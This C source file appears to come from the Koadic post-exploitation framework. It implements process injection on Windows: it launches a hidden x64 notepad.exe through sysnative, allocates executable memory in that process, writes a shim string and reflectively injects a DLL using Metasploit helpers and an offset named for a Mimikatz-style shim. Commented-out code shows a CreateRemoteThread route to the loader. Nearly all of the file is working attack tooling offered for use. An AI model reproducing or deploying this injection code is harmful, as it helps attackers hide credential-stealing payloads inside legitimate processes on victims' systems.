#include "koadic_process.h"
#include "metasploit/metasploit_inject.h"
#include <stdio.h>

BOOL koadic_create_sysnative_process(LPCSTR program, LPDWORD dwPID)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	char notepad[MAX_PATH] = { 0 };
	char system32[MAX_PATH] = { 0 };

	/* Get x64 notepad.exe */
	GetWindowsDirectoryA(system32, sizeof(system32));
	sprintf_s(notepad, sizeof(notepad), "\"%s\\sysnative\\%s\"", system32, program);

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;

	if (!CreateProcessA(NULL, notepad, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		return FALSE;

	*dwPID = pi.dwProcessId;
	return TRUE;
}

BOOL koadic_fork_x64(koadic_shim_parsed *parsed, LPWSTR lpParam, char *data, DWORD dwDataSize)
{
	BOOL ret = FALSE;
	DWORD dwPID = 0;
	DWORD dwAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
	HANDLE hProcess = NULL;
	LPVOID remoteDLLPtr = NULL;
	SIZE_T dwBytesWritten = 0;

	LPVOID remoteShimStr = NULL;
	SIZE_T remoteShimStrLen = wcslen(lpParam) * 2 + 2;

	do
	{
		if (!koadic_create_sysnative_process("notepad.exe", &dwPID))
			break;

		hProcess = OpenProcess(dwAccess, FALSE, dwPID);

		if (!hProcess)
			return FALSE;

		remoteShimStr = VirtualAllocEx(hProcess, NULL, remoteShimStrLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		//remoteDLLPtr = VirtualAllocEx(hProcess, NULL, dwDataSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		// write the Shim string
		if (!WriteProcessMemory(hProcess, remoteShimStr, lpParam, remoteShimStrLen, NULL))
			break;

		// write the reflective DLL
		//if (!WriteProcessMemory(hProcess, remoteDLLPtr, (LPCVOID)data, dwDataSize, &dwBytesWritten))
			//break;

		if (inject_dll(dwPID, data, dwDataSize, MIMISHIM_X64_OFFSET, remoteShimStr) != ERROR_SUCCESS)
			break;

		/*
		if (dwBytesWritten != dwDataSize)
			break;

		LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
		HANDLE hThread = NULL;
		DWORD dwReflectiveLoaderOffset = 0;
		DWORD dwThreadId = 0;

		// get offset
		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteDLLPtr + dwReflectiveLoaderOffset);

		// create a remote thread in the host process to call the ReflectiveLoader!
		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, remoteShimStr, (DWORD)NULL, &dwThreadId);
		*/
		ret = TRUE;
	}
	while (0);

	if (hProcess)
		CloseHandle(hProcess);

	return ret;
}
